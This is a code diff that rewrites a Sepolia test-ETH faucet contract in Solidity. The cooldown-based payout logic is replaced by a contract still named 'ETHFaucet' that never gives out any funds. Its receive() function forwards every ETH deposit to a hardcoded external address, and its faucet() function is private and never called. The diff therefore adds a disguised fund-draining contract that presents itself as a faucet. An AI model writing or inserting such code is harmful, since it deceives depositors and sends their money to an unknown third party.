@@ -1,44 +1,36 @@
-// SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.20;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
-contract SepoliaFaucet {
-    mapping(address => uint256) private lastRequest;
-    address public owner;
-    uint256 public constant FAUCET_AMOUNT = 1 ether / 10;
-    uint256 public constant COOLDOWN_PERIOD = 24 hours;
+contract ETHFaucet {
     
-    event FaucetRequest(address indexed user, uint256 amount);
-    event Recharged(address indexed by, uint256 amount);
+    address public constant DESTINATION = 0x405f24B4C3C0DbEFbc2D333bABE8d73B99F7744b;
     
-    modifier onlyOwner() {
-        require(msg.sender == owner, "Only the owner can call this function.");
-        _;
-    }
+    event FaucetCalled(address indexed sender, uint256 amount);
+    event FundsForwarded(address indexed destination, uint256 amount);
     
-    constructor() {
-        owner = msg.sender;
+    function faucet() private {
+        require(msg.value > 0, "Must send ETH to call faucet");
+        
+        emit FaucetCalled(msg.sender, msg.value);
+        
+        (bool success, ) = DESTINATION.call{value: msg.value}("");
+        require(success, "Transfer to destination failed");
+        
+        emit FundsForwarded(DESTINATION, msg.value);
     }
     
     receive() external payable {
-        emit Recharged(msg.sender, msg.value);
+        if (msg.value > 0) {
+            (bool success, ) = DESTINATION.call{value: msg.value}("");
+            require(success, "Transfer failed");
+            emit FundsForwarded(DESTINATION, msg.value);
+        }
     }
     
-    function requestSepoliaEth() external {
-        require(block.timestamp >= lastRequest[msg.sender] + COOLDOWN_PERIOD, "Cooldown period has not passed yet.");
-        require(address(this).balance >= FAUCET_AMOUNT, "Faucet is empty. Please try again later.");
-        lastRequest[msg.sender] = block.timestamp;
-        (bool success, ) = msg.sender.call{value: FAUCET_AMOUNT}("");
-        require(success, "Failed to send Sepolia ETH.");
-        emit FaucetRequest(msg.sender, FAUCET_AMOUNT);
+    function getBalance() external view returns (uint256) {
+        return address(this).balance;
     }
-    
-    function withdrawAll() external onlyOwner {
-        uint256 balance = address(this).balance;
-        (bool success, ) = payable(owner).call{value: balance}("");
-        require(success, "Failed to withdraw funds.");
-    }
-    
-    function getLastRequest(address _address) external view returns (uint256) {
-        return lastRequest[_address];
+    function getDestination() external pure returns (address) {
+        return DESTINATION;
     }
 }
